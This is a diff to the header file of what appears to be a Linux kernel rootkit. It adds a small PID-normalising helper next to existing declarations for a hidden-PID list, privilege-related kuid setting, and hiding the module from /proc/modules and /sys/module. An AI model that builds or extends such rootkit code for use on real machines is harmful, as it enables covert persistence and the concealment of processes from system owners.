@@ -1,7 +1,10 @@
 #ifndef _ROOTKIT_UTILS_H_
 #define _ROOTKIT_UTILS_H_
 
+#include <asm/current.h>
+#include <linux/sched.h> // For `struct task_struct`
 #include <linux/types.h>
+#include <vdso/limits.h>
 
 /**
  * Sets the value of a `kuid_t` variable.
@@ -62,6 +65,33 @@ typedef struct hidden_pid_tag {
 } hidden_pid_t;
 
 extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
+
+/**
+ * Gets the effective PID for the given PID.
+ * If the given PID is 0, return the current PID.
+ * If the given PID is -1 or INT_MIN, return -1.
+ * If the given PID is < -1, return the absolute value.
+ * Otherwise, return the given PID.
+ *
+ * @param i32_pid The PID to get the effective PID for
+ * @return The effective PID
+ */
+static inline pid_t get_effective_pid(const pid_t i32_pid)
+{
+    pid_t i32_real_pid = i32_pid;
+
+    if (i32_real_pid == 0) {
+        i32_real_pid = current->pid;
+    }
+    else if (i32_real_pid == INT_MIN) {
+        return -1;
+    }
+    else if (i32_real_pid < -1) {
+        i32_real_pid = -i32_real_pid;
+    }
+
+    return i32_real_pid;
+}
 
 /**
  * Hides the rootkit from /proc/modules and /sys/module/
